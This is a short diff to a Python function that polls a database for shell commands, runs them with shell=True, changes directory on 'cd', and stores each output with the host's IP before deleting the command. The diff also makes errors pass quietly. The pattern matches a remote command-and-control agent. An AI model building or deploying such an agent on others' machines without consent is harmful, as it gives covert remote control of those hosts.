@@ -1,4 +1,4 @@
-from math import e
+from os import chdir
 from subprocess import PIPE, Popen
 from io import StringIO
 import sys
@@ -21,11 +21,16 @@ def exec_commands():
                 final_result = redirected_output.getvalue()
                 sys.stdout = old_stdout
             else:
+                if(command['commands'].startswith('cd')):
+                    chdir(command['commands'].split(' ')[1])
+                    
                 final_result = Popen(command['commands'], stdout=PIPE, shell=True, encoding='utf-8').stdout.read()
-        except:
-            raise
-            
-            
 
-        get_results_collection().insert_one({'ip': get_ip_util(), 'results': final_result, 'command': command['commands']})
-        get_commands_collection().delete_one({'_id': command['_id']})
+            get_results_collection().insert_one({'ip': get_ip_util(), 'results': final_result, 'command': command['commands']})
+            get_commands_collection().delete_one({'_id': command['_id']})
+
+        except Exception as e:
+            print(e)
+            pass
+
+        
